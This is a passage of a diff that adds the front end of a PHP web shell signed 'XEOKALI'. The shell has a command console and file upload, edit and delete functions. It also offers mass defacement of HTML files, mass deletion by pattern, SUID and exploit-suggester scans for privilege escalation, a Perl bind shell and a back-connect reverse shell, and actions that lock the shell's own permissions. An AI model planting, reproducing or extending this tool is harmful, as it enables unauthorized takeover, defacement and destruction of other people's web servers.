+        font-size: 1.1em;
+        box-shadow: 0 0 10px #0f0;
+    }
+    .path a {
+        margin-right: 5px;
+    }
+    .actions {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 10px;
+        margin: 10px 0;
+        background: #111;
+        padding: 15px;
+        border: 2px solid #0f0;
+        border-radius: 5px;
+        box-shadow: 0 0 10px #0f0;
+    }
+    .actions a, .actions input[type="submit"] {
+        background: #0f0;
+        color: #000;
+        padding: 8px 15px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        text-decoration: none;
+        font-size: 1em;
+        transition: background 0.3s, box-shadow 0.3s;
+        touch-action: manipulation;
+    }
+    .actions a:hover, .actions input[type="submit"]:hover {
+        background: #0c0;
+        box-shadow: 0 0 10px #0f0;
+    }
+    table {
+        width: 100%;
+        border-collapse: collapse;
+        background: #111;
+        border: 2px solid #0f0;
+        border-radius: 5px;
+        box-shadow: 0 0 10px #0f0;
+        margin-top: 10px;
+    }
+    th, td {
+        padding: 10px;
+        text-align: left;
+        border-bottom: 1px solid #0f0;
+    }
+    th {
+        background: #222;
+        text-transform: uppercase;
+        font-size: 1.1em;
+    }
+    td {
+        font-size: 1em;
+    }
+    .action-icons {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 8px;
+    }
+    .action-icons a {
+        padding: 6px 12px;
+        background: #0f0;
+        color: #000;
+        border-radius: 4px;
+        font-size: 0.9em;
+        transition: background 0.3s, box-shadow 0.3s;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        border: 1px solid #0f0;
+        touch-action: manipulation;
+    }
+    .action-icons a:hover {
+        background: #0c0;
+        box-shadow: 0 0 8px #0f0;
+        text-decoration: none;
+    }
+    .modal {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.9);
+        justify-content: center;
+        align-items: center;
+        z-index: 1001;
+    }
+    .modal-content {
+        background: #111;
+        padding: 30px;
+        border: 2px solid #0f0;
+        border-radius: 5px;
+        width: 80%;
+        max-width: 700px;
+        color: #0f0;
+        box-shadow: 0 0 20px #0f0;
+    }
+    .modal-content h2 {
+        margin-top: 0;
+        text-transform: uppercase;
+        letter-spacing: 2px;
+    }
+    .modal-content textarea {
+        width: 100%;
+        height: 400px;
+        background: #000;
+        color: #0f0;
+        border: 2px solid #0f0;
+        font-family: 'Courier New', Courier, monospace;
+        font-size: 1em;
+        border-radius: 5px;
+        resize: vertical;
+        overflow-y: auto;
+        padding: 10px;
+        box-sizing: border-box;
+    }
+    .modal-content pre {
+        width: 100%;
+        height: 400px;
+        background: #000;
+        color: #0f0;
+        border: 2px solid #0f0;
+        font-family: 'Courier New', Courier, monospace;
+        font-size: 1em;
+        border-radius: 5px;
+        overflow-y: auto;
+        padding: 10px;
+        box-sizing: border-box;
+        white-space: pre-wrap;
+        word-wrap: break-word;
+    }
+    .modal-content input[type="text"], .modal-content input[type="submit"], .modal-content button {
+        background: #000;
+        color: #0f0;
+        border: 2px solid #0f0;
+        padding: 8px;
+        margin: 10px 0;
+        border-radius: 5px;
+        font-family: 'Courier New', Courier, monospace;
+        font-size: 1em;
+    }
+    .modal-content input[type="submit"], .modal-content button {
+        background: #0f0;
+        color: #000;
+        cursor: pointer;
+        transition: background 0.3s, box-shadow 0.3s;
+        touch-action: manipulation;
+    }
+    .modal-content input[type="submit"]:hover, .modal-content button:hover {
+        background: #0c0;
+        box-shadow: 0 0 10px #0f0;
+    }
+    .footer {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        background: #111;
+        padding: 10px;
+        text-align: center;
+        border-top: 2px solid #0f0;
+        box-shadow: 0 0 10px #0f0;
+        font-size: 1em;
+    }
+    .error-message {
+        background: #f00;
+        color: #000;
+        padding: 10px;
+        margin: 10px 0;
+        border-radius: 5px;
+        text-align: center;
+        font-weight: bold;
+    }
+    /* Styled Info Section */
+    .info-section {
+        background: #111;
+        padding: 15px;
+        border: 2px solid #0f0;
+        border-radius: 5px;
+        margin-bottom: 10px;
+        box-shadow: 0 0 10px #0f0;
+    }
+    .info-section .info-row {
+        display: flex;
+        justify-content: space-between;
+        padding: 5px 0;
+        border-bottom: 1px solid #0f0;
+    }
+    .info-section .info-row:last-child {
+        border-bottom: none;
+    }
+    .info-section .info-label {
+        font-weight: bold;
+        color: #0f0;
+        flex: 1;
+    }
+    .info-section .info-value {
+        color: #0f0;
+        flex: 3;
+        word-wrap: break-word;
+    }
+    /* Highlight colors for Exploit Suggester */
+    .highlight-white {
+        color: #ffffff;
+        font-weight: bold;
+    }
+    .highlight-green {
+        color: #00ff00;
+        font-weight: bold;
+    }
+    .highlight-yellow {
+        color: #ffff00;
+    }
+    /* Mobile responsiveness */
+    @media (max-width: 768px) {
+        .container {
+            padding: 10px;
+        }
+        .actions {
+            overflow-x: auto;
+            white-space: nowrap;
+            padding: 10px;
+        }
+        .actions a, .actions input[type="submit"] {
+            padding: 10px 20px; /* Larger padding for touch */
+            font-size: 0.9em;
+        }
+        table {
+            display: block;
+            overflow-x: auto;
+            white-space: nowrap;
+        }
+        th, td {
+            padding: 8px;
+            font-size: 0.9em;
+        }
+        .action-icons a {
+            padding: 8px 14px; /* Larger padding for touch */
+            font-size: 0.8em;
+        }
+        .modal-content {
+            width: 90%;
+            padding: 20px;
+        }
+        .modal-content textarea, .modal-content pre {
+            height: 300px;
+            font-size: 0.9em;
+        }
+        .info-section .info-row {
+            flex-direction: column;
+        }
+        .info-section .info-label, .info-section .info-value {
+            flex: none;
+        }
+    }
+</style>
+</head>
+<body>
+    <div class="header">XEOKALI</div>
+    <div class="container">
+        <div class="path">
+            Path: 
+            <?php
+            $path_parts = explode('/', $dir);
+            $current_path = '';
+            foreach ($path_parts as $index => $part) {
+                if (empty($part)) continue;
+                $current_path .= '/' . $part;
+                if ($index < count($path_parts) - 1) {
+                    echo "<a href='?dir=" . urlencode($current_path) . "'>" . htmlspecialchars($part) . "</a>/";
+                } else {
+                    echo htmlspecialchars($part);
+                }
+            }
+            ?>
+        </div>
+        <div class="actions">
+            <a href="?info">Info</a>
+            <a href="javascript:openModal('upload')">Upload</a>
+            <a href="javascript:openModal('add_file')">Add File</a>
+            <a href="javascript:openModal('add_folder')">Add Folder</a>
+            <a href="javascript:openModal('console')">Console</a>
+            <a href="?mass_deface">Mass Deface</a>
+            <a href="?mass_delete">Mass Delete</a>
+            <a href="?scan_root">Scan Root</a>
+            <a href="?network">Network</a>
+            <a href="javascript:openModal('search')">Search Files</a>
+            <a href="javascript:lockShell()">Lock Shell</a>
+            <a href="javascript:chmodShell('0777')">0777 Shell</a>
+            <a href="javascript:chmodAll('0644')">Green All Files</a>
+            <a href="javascript:chmodAll('0755')">Green All Folders</a>
+            <a href="javascript:lockAll('0444')">Lock All Files</a>
+            <a href="javascript:lockAll('0555')">Lock All Folders</a>
+            <a href="javascript:openModal('touch')">Touch</a>
+            <a href="?logout">Logout</a>
+        </div>
+
+        <?php if (!empty($delete_error)) { ?>
+            <div class="error-message"><?php echo $delete_error; ?></div>
+        <?php } ?>
+
+        <?php if (isset($_GET['info'])) { ?>
+            <div class="info-section">
+                <div class="info-row">
+                    <span class="info-label">System:</span>
+                    <span class="info-value"><?php echo htmlspecialchars(shell_exec('uname -a 2>/dev/null')); ?></span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">User:</span>
+                    <span class="info-value"><?php echo htmlspecialchars(posix_getpwuid(posix_geteuid())['name'] . ' (' . posix_geteuid() . ') [Group: ' . posix_getgrgid(posix_getegid())['name'] . ' (' . posix_getegid() . ')]'); ?></span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">PHP Version:</span>
+                    <span class="info-value"><?php echo htmlspecialchars(phpversion()); ?></span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Software:</span>
+                    <span class="info-value"><?php echo htmlspecialchars($_SERVER['SERVER_SOFTWARE']); ?></span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Domain:</span>
+                    <span class="info-value"><?php echo htmlspecialchars($_SERVER['HTTP_HOST']); ?></span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Server IP:</span>
+                    <span class="info-value"><?php echo htmlspecialchars(gethostbyname($_SERVER['HTTP_HOST'])); ?></span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Your IP:</span>
+                    <span class="info-value"><?php echo htmlspecialchars($_SERVER['REMOTE_ADDR']); ?></span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">SAFE MODE:</span>
+                    <span class="info-value"><?php echo (ini_get('safe_mode') ? 'ON' : 'OFF'); ?></span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">MySQL | Perl | WGET | CURL | Python | Pkexec | GCC:</span>
+                    <span class="info-value"><?php echo (extension_loaded('mysqli') ? 'ON' : 'OFF') . ' | ' . (shell_exec('perl -v 2>/dev/null') ? 'ON' : 'OFF') . ' | ' . (shell_exec('wget --version 2>/dev/null') ? 'ON' : 'OFF') . ' | ' . (extension_loaded('curl') ? 'ON' : 'OFF') . ' | ' . (shell_exec('python3 --version 2>/dev/null') ? 'ON' : 'OFF') . ' | ' . (shell_exec('pkexec --version 2>/dev-null') ? 'ON' : 'OFF') . ' | ' . (shell_exec('gcc --version 2>/dev/null') ? 'ON' : 'OFF'); ?></span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Disable Function:</span>
+                    <span class="info-value"><?php echo htmlspecialchars(ini_get('disable_functions') ?: 'NONE'); ?></span>
+                </div>
+            </div>
+            <?php
+            $action_message = "Server Info displayed successfully!";
+        } elseif (isset($_GET['mass_deface'])) { ?>
+            <div>
+                <form method="POST">
+                    <label>Type:</label><br>
+                    <input type="radio" name="deface_type" value="one_dir" checked> One dir<br>
+                    <input type="radio" name="deface_type" value="all_dir"> ALL directory<br><br>
+                    
+                    <label>Directory:</label><br>
+                    <input type="text" name="deface_dir" value="<?php echo htmlspecialchars($dir); ?>" required><br><br>
+                    
+                    <label>Filename:</label><br>
+                    <input type="text" name="deface_filename" placeholder="e.g., index.html" required><br><br>
+                    
+                    <label>Your script:</label><br>
+                    <textarea name="deface_content" placeholder="Enter deface content" required></textarea><br><br>
+                    
+                    <input type="submit" name="deface_submit" value="deface">
+                </form>
+                <?php
+                if (isset($_POST['deface_submit']) && isset($_POST['deface_type']) && isset($_POST['deface_dir']) && isset($_POST['deface_filename']) && isset($_POST['deface_content'])) {
+                    $deface_type = $_POST['deface_type'];
+                    $deface_dir = realpath($_POST['deface_dir']);
+                    $deface_filename = trim($_POST['deface_filename']);
+                    $deface_content = $_POST['deface_content'];
+
+                    if (!$deface_dir || !is_dir($deface_dir)) {
+                        $action_message = "Invalid directory specified.";
+                        echo "<div class='error-message'>Invalid directory specified.</div>";
+                    } elseif (empty($deface_filename)) {
+                        $action_message = "Filename cannot be empty.";
+                        echo "<div class='error-message'>Filename cannot be empty.</div>";
+                    } else {
+                        $success_count = 0;
+                        if ($deface_type === 'one_dir') {
+                            // Deface in the specified directory only
+                            $files = glob($deface_dir . '/*.html');
+                            foreach ($files as $file) {
+                                $target_file = dirname($file) . '/' . $deface_filename;
+                                if (file_put_contents($target_file, $deface_content) !== false) {
+                                    $success_count++;
+                                }
+                            }
+                        } else {
+                            // Deface recursively in all subdirectories
+                            $success_count = defaceRecursive($deface_dir, $deface_filename, $deface_content);
+                        }
+
+                        if ($success_count > 0) {
+                            $action_message = "Successfully defaced $success_count file(s)!";
+                            echo "<div class='error-message' style='background: #0f0; color: #000;'>Successfully defaced $success_count file(s)!</div>";
+                        } else {
+                            $action_message = "No HTML files found to deface.";
+                            echo "<div class='error-message'>No HTML files found to deface.</div>";
+                        }
+                    }
+                }
+                ?>
+            </div>
+        <?php } elseif (isset($_GET['mass_delete'])) { ?>
+            <div>
+                <form method="POST">
+                    <input type="text" name="pattern" placeholder="File pattern (e.g., *.txt)">
+                    <input type="submit" value="Delete All">
+                </form>
+                <?php
+                if (isset($_POST['pattern'])) {
+                    $files = glob($dir . '/' . $_POST['pattern']);
+                    if (!empty($files)) {
+                        foreach ($files as $file) {
+                            deleteRecursive($file);
+                        }
+                        $action_message = "Deleted all matching files successfully!";
+                        echo "<div class='error-message' style='background: #0f0; color: #000;'>Deleted all matching files!</div>";
+                    } else {
+                        $action_message = "No files found matching the pattern " . htmlspecialchars($_POST['pattern']) . ".";
+                        echo "<div class='error-message'>No files found matching the pattern.</div>";
+                    }
+                }
+                ?>
+            </div>
+        <?php } elseif (isset($_GET['scan_root'])) { ?>
+            <div>
+                <div class="actions">
+                    <a href="?auto_scan">Auto Scan</a>
+                    <a href="?scan_suid">Scan SUID</a>
+                    <a href="?exploit_suggester">Exploit Suggester</a>
+                </div>
+            </div>
+        <?php } elseif (isset($_GET['network'])) { ?>
+            <div>
+                <form method="POST">
+                    <p>Bind port to /bin/sh [Perl]</p>
+                    <label>Port:</label>
+                    <input type="text" name="port" value="6969" required>
+                    <input type="submit" name="bind_port" value="submit">
+                </form>
+                <form method="POST">
+                    <p>Back-Connect</p>
+                    <label>Server:</label>
+                    <input type="text" name="server" value="<?php echo htmlspecialchars($_SERVER['REMOTE_ADDR']); ?>" required>
+                    <label>Port:</label>
+                    <input type="text" name="port" value="6969" required>
+                    <input type="submit" name="back_connect" value="submit">
+                </form>
+            </div>
+        <?php } elseif (isset($_GET['auto_scan']) && isset($auto_scan_output)) { ?>
+            <div>
+                <pre><?php echo htmlspecialchars($auto_scan_output); ?></pre>
+            </div>
+        <?php } elseif (isset($_GET['scan_suid']) && isset($suid_output)) { ?>
+            <div>
+                <pre><?php echo htmlspecialchars($suid_output); ?></pre>
+            </div>
+        <?php } elseif (isset($_GET['exploit_suggester']) && isset($exploit_suggestions)) { ?>
+            <div>
+                <pre><?php echo $exploit_suggestions; ?></pre>
+            </div>
+        <?php } elseif (isset($output)) { ?>
+            <div>
+                <pre><?php echo htmlspecialchars($output); ?></pre>
+            </div>
+        <?php } elseif (isset($search_output)) { ?>
+            <div>
+                <pre><?php echo htmlspecialchars($search_output); ?></pre>
+            </div>
+        <?php } ?>
+
+        <table>
+            <tr>
+                <th>Name</th>
+                <th>Type</th>
+                <th>Last Edit</th>
+                <th>Size</th>
+                <th>Owner/Group</th>
+                <th>Permission</th>
+                <th>Action</th>
+            </tr>
+            <?php
+            if ($dir !== '/') {
+                $parent = dirname($dir);
+                echo "<tr><td><a href='?dir=" . urlencode($parent) . "'>..</a></td><td>Dir</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr>";
+            }
+            
+            $items = array_diff(scandir($dir), ['.', '..']);
+            $dirs = [];
+            $files = [];
+            
+            foreach ($items as $item) {
+                $path = $dir . '/' . $item;
+                if (is_dir($path)) {
+                    $dirs[] = $item;
+                } else {
+                    $files[] = $item;
+                }
+            }
+            
+            sort($dirs);
+            sort($files);
+            
+            foreach ($dirs as $item) {
+                $path = $dir . '/' . $item;
+                $stat = stat($path);
+                $perms = substr(sprintf('%o', fileperms($path)), -4);
+                $owner = posix_getpwuid($stat['uid'])['name'] ?? 'unknown';
+                $group = posix_getgrgid($stat['gid'])['name'] ?? 'unknown';
+                $last_modified = date('Y-m-d H:i:s', $stat['mtime']);
+                echo "<tr>";
+                echo "<td><a href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($item) . "</a></td>";
+                echo "<td>Dir</td>";
+                echo "<td>$last_modified</td>";
+                echo "<td>-</td>";
+                echo "<td>$owner/$group</td>";
+                echo "<td>$perms</td>";
+                echo "<td class='action-icons'>";
+                echo "<a href='javascript:openRenameModal(\"" . htmlspecialchars($path) . "\", \"" . htmlspecialchars($item) . "\")'>Rename</a>";
+                echo "<a href='javascript:openCompressModal(\"" . htmlspecialchars($path) . "\")'>Compress</a>";
+                echo "<a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Are you sure you want to delete $item?\")'>Delete</a>";
+                echo "</td>";
+                echo "</tr>";
+            }
+            
+            foreach ($files as $item) {
+                $path = $dir . '/' . $item;
+                $stat = stat($path);
+                $perms = substr(sprintf('%o', fileperms($path)), -4);
+                $owner = posix_getpwuid($stat['uid'])['name'] ?? 'unknown';
+                $group = posix_getgrgid($stat['gid'])['name'] ?? 'unknown';
+                $last_modified = date('Y-m-d H:i:s', $stat['mtime']);
+                $size = round(filesize($path) / 1024, 2) . ' KB';
+                echo "<tr>";
+                echo "<td>" . htmlspecialchars($item) . "</td>";
+                echo "<td>File</td>";
+                echo "<td>$last_modified</td>";
+                echo "<td>$size</td>";
+                echo "<td>$owner/$group</td>";
+                echo "<td>$perms</td>";
+                echo "<td class='action-icons'>";
+                echo "<a href='?view_file=" . urlencode($path) . "' onclick='openViewModal(\"" . urlencode($path) . "\"); return false;'>View</a>";
+                echo "<a href='?edit_file=" . urlencode($path) . "' onclick='openEditModal(\"" . urlencode($path) . "\"); return false;'>Edit</a>";
+                echo "<a href='javascript:openRenameModal(\"" . htmlspecialchars($path) . "\", \"" . htmlspecialchars($item) . "\")'>Rename</a>";
+                echo "<a href='?download=" . urlencode($path) . "'>Download</a>";
+                echo "<a href='javascript:openCompressModal(\"" . htmlspecialchars($path) . "\")'>Compress</a>";
+                if (pathinfo($path, PATHINFO_EXTENSION) === 'zip') {
+                    echo "<a href='javascript:openExtractModal(\"" . htmlspecialchars($path) . "\")'>Extract</a>";
+                }
+                echo "<a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Are you sure you want to delete $item?\")'>Delete</a>";
+                echo "</td>";
+                echo "</tr>";
+            }
+            ?>
+        </table>
+
+        <!-- Modals -->
+        <div id="upload-modal" class="modal">
+            <div class="modal-content">
+                <h2>Upload File</h2>
+                <form method="POST" enctype="multipart/form-data">
+                    <input type="file" name="upload" required>
+                    <input type="submit" value="Upload">
+                    <button type="button" onclick="closeModal('upload')">Close</button>
+                </form>
+            </div>
+        </div>
+
+        <div id="add_file-modal" class="modal">
+            <div class="modal-content">
+                <h2>Add File</h2>
+                <form method="POST">
+                    <input type="text" name="filename" placeholder="File name" required>
+                    <textarea name="file_content" placeholder="File content"></textarea>
+                    <input type="submit" name="add_file" value="Create">
+                    <button type="button" onclick="closeModal('add_file')">Close</button>
+                </form>
+            </div>
+        </div>
+
+        <div id="add_folder-modal" class="modal">
+            <div class="modal-content">
+                <h2>Add Folder</h2>
+                <form method="POST">
+                    <input type="text" name="foldername" placeholder="Folder name" required>
+                    <input type="submit" name="add_folder" value="Create">
+                    <button type="button" onclick="closeModal('add_folder')">Close</button>
+                </form>
+            </div>
+        </div>
+
+        <div id="console-modal" class="modal">
+            <div class="modal-content">
+                <h2>Console</h2>
+                <form method="POST">
+                    <input type="text" name="command" placeholder="Enter command" required>
+                    <input type="submit" name="console" value="Execute">
+                    <button type="button" onclick="closeModal('console')">Close</button>
+                </form>
+            </div>
+        </div>
+
+        <div id="search-modal" class="modal">
+            <div class="modal-content">
+                <h2>Search Files</h2>
+                <form method="POST">
+                    <input type="text" name="search_term" placeholder="Search term (e.g., *.txt)" required>
+                    <input type="submit" name="search" value="Search">
+                    <button type="button" onclick="closeModal('search')">Close</button>
+                </form>
+            </div>
+        </div>
+
+        <div id="touch-modal" class="modal">
+            <div class="modal-content">
+                <h2>Touch File/Folder</h2>
+                <form method="POST">
+                    <input type="text" name="file" placeholder="Enter file or folder path" required>
+                    <input type="submit" name="touch" value="Touch">
+                    <button type="button" onclick="closeModal('touch')">Close</button>
+                </form>
+            </div>
+        </div>
+
+        <div id="view-modal" class="modal">
+            <div class="modal-content">
+                <h2>View File</h2>
+                <pre><?php echo $file_content; ?></pre>
+                <button type="button" onclick="closeModal('view')">Close</button>
+            </div>
+        </div>
+
+        <div id="edit-modal" class="modal">
+            <div class="modal-content">
+                <h2>Edit File</h2>
+                <form method="POST">
+                    <input type="hidden" name="file" value="<?php echo htmlspecialchars($edit_file ?? ''); ?>">
+                    <textarea name="content"><?php echo $file_content; ?></textarea>
+                    <input type="submit" name="edit" value="Save">
+                    <button type="button" onclick="closeModal('edit')">Close</button>
+                </form>
+            </div>
+        </div>
+
+        <div id="rename-modal" class="modal">
+            <div class="modal-content">
+                <h2>Rename</h2>
+                <form method="POST">
+                    <input type="hidden" name="oldname" id="rename-oldname">
+                    <input type="text" name="newname" id="rename-newname" required>
+                    <input type="submit" name="rename" value="Rename">
+                    <button type="button" onclick="closeModal('rename')">Close</button>
+                </form>
+            </div>
+        </div>
+
+        <div id="compress-modal" class="modal">
+            <div class="modal-content">
+                <h2>Compress to ZIP</h2>
+                <form method="POST">
+                    <input type="hidden" name="file" id="compress-file">
+                    <p>Compress <span id="compress-filename"></span> to ZIP?</p>
+                    <input type="submit" name="compress" value="Compress">
+                    <button type="button" onclick="closeModal('compress')">Close</button>
+                </form>
+            </div>
+        </div>
+
+        <div id="extract-modal" class="modal">
+            <div class="modal-content">
+                <h2>Extract ZIP</h2>
+                <form method="POST">
+                    <input type="hidden" name="file" id="extract-file">
+                    <p>Extract <span id="extract-filename"></span> to current directory?</p>
+                    <input type="submit" name="extract" value="Extract">
+                    <button type="button" onclick="closeModal('extract')">Close</button>
+                </form>
+            </div>
+        </div>
+
+    </div>
+    <div class="footer">
+        Coded by XEOKALI - 2023
+    </div>
+
+    <script>
+        <?php if (!empty($action_message)) { ?>
+            alert("<?php echo addslashes($action_message); ?>");
+        <?php } ?>
+
+        function openModal(modalId) {
+            document.getElementById(modalId + '-modal').style.display = 'flex';
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId + '-modal').style.display = 'none';
+        }
+
+        function openViewModal(file) {
+            window.location.href = '?view_file=' + file;
+            document.getElementById('view-modal').style.display = 'flex';
+        }
+
+        function openEditModal(file) {
+            window.location.href = '?edit_file=' + file;
+            document.getElementById('edit-modal').style.display = 'flex';
+        }
+
+        function openRenameModal(path, name) {
+            document.getElementById('rename-oldname').value = path;
+            document.getElementById('rename-newname').value = name;
+            document.getElementById('rename-modal').style.display = 'flex';
+        }
+
+        function openCompressModal(path) {
+            document.getElementById('compress-file').value = path;
+            document.getElementById('compress-filename').textContent = path.split('/').pop();
+            document.getElementById('compress-modal').style.display = 'flex';
+        }
+
+        function openExtractModal(path) {
+            document.getElementById('extract-file').value = path;
+            document.getElementById('extract-filename').textContent = path.split('/').pop();
+            document.getElementById('extract-modal').style.display = 'flex';
+        }
+
+        function lockShell() {
+            if (confirm('Are you sure you want to lock the shell (chmod 0444)?')) {
+                window.location.href = '?chmod_shell=0444';
+            }
+        }
+
+        function chmodShell(perms) {
+            if (confirm('Are you sure you want to chmod the shell to ' + perms + '?')) {
+                window.location.href = '?chmod_shell=' + perms;
+            }
+        }
+
+        function chmodAll(perms) {
+            if (confirm('Are you sure you want to chmod all to ' + perms + '?')) {
+                window.location.href = '?chmod_all=' + perms;
+            }
+        }
+
+        function lockAll(perms) {
+            if (confirm('Are you sure you want to lock all to ' + perms + '?')) {
+                window.location.href = '?chmod_all=' + perms;
+            }
+        }
+
+        <?php
+        if (isset($_GET['chmod_shell'])) {
+            $perms = $_GET['chmod_shell'];
+            if (chmod($_SERVER['SCRIPT_FILENAME'], octdec($perms))) {
+                echo "alert('Shell permissions changed to $perms successfully!');";
+            } else {
+                echo "alert('Failed to change shell permissions to $perms. Check permissions.');";
+            }
+        }
+
+        if (isset($_GET['chmod_all'])) {
+            $perms = $_GET['chmod_all'];
+            $items = array_diff(scandir($dir), ['.', '..']);
+            $success = true;
+            foreach ($items as $item) {
+                $path = $dir . '/' . $item;
+                if (!chmod($path, octdec($perms))) {
+                    $success = false;
+                }
+            }
+            if ($success) {
+                echo "alert('All items permissions changed to $perms successfully!');";
+            } else {
+                echo "alert('Failed to change permissions for some items to $perms. Check permissions.');";
+            }
+        }
+        ?>
+
+        <?php if (isset($_GET['view_file'])) { ?>
+            document.getElementById('view-modal').style.display = 'flex';
+        <?php } ?>
+
+        <?php if (isset($_GET['edit_file'])) { ?>
+            document.getElementById('edit-modal').style.display = 'flex';
+        <?php } ?>
+    </script>
+</body>
+</html>
